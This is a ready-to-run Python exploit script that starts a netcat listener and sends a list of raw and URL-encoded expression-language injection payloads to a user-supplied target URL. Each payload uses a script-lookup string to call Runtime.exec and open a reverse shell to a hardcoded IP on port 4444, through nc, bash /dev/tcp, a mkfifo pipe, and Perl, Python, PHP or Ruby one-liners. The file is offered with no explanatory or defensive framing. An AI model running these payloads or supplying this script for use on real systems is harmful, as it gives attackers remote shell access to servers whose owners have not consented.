import requests
import time
import subprocess

# Reverse shell IP and Port
revshell_ip = "192.168.145.93"
revshell_port = "4444"

# Common payload variations with escaped curly braces for Python string formatting
payloads = [
    "${{script:javascript:java.lang.Runtime.getRuntime().exec('nc {} {} -e /bin/bash')}}",
    "${{script:javascript:java.lang.Runtime.getRuntime().exec('bash -c \\'bash -i >& /dev/tcp/{}/{} 0>&1\\'')}}",
    "${{script:javascript:java.lang.Runtime.getRuntime().exec('sh -i >& /dev/tcp/{}/{} 0>&1')}}",
    "${{script:javascript:java.lang.Runtime.getRuntime().exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f')}}",
    "${{script:javascript:java.lang.Runtime.getRuntime().exec('perl -e \\'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};\\'')}}",
    "${{script:javascript:java.lang.Runtime.getRuntime().exec('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);\\'')}}",
    "${{script:javascript:java.lang.Runtime.getRuntime().exec('php -r \\'$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");\\'')}}",
    "${{script:javascript:java.lang.Runtime.getRuntime().exec('ruby -rsocket -e \\'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\\'')}}"
]

# URL-encoded versions of the above payloads with escaped curly braces
url_encoded_payloads = [
    "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28'nc%20{}%20{}%20-e%20%2Fbin%2Fbash'%29%7D",
    "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28'bash%20-c%20%5C%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261%5C%27'%29%7D",
    "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261'%29%7D",
    "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20{}%20{}%20%3E%2Ftmp%2Ff'%29%7D",
    "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28'perl%20-e%20%5C%27use%20Socket%3B%24i%3D%22{}%22%3B%24p%3D{}%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%5C%27'%29%7D",
    "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28'python3%20-c%20%5C%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22{}%22%2C{}%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%5C%27'%29%7D",
    "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28'php%20-r%20%5C%27%24sock%3Dfsockopen%28%22{}%22%2C{}%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%5C%27'%29%7D",
    "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28'ruby%20-rsocket%20-e%20%5C%27f%3DTCPSocket.open%28%22{}%22%2C{}%29.to_i%3Bexec%20sprintf%28%22%2Fbin%2Fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf%29%5C%27'%29%7D"
]

# Start a netcat listener
def start_nc_listener():
    print(f"Starting Netcat listener on port {revshell_port}...")
    subprocess.Popen(["nc", "-lvnp", revshell_port])

# Send payloads
def send_payloads(target_url, payload_list):
    for payload in payload_list:
        formatted_payload = payload.format(revshell_ip, revshell_port)
        full_url = target_url + formatted_payload
        
        try:
            print(f"Sending payload: {formatted_payload}")
            response = requests.get(full_url)
            print(f"Response: {response.status_code}")
        except Exception as e:
            print(f"Error sending payload: {e}")

        # Wait a few seconds to allow reverse shell connection
        time.sleep(5)

if __name__ == "__main__":
    # User input for target URL
    target_url = input("Enter the full target URL (including http:// or https://): ")
    
    start_nc_listener()
    print("Sending raw payloads:")
    send_payloads(target_url, payloads)
    
    print("\nSending URL-encoded payloads:")
    send_payloads(target_url, url_encoded_payloads)
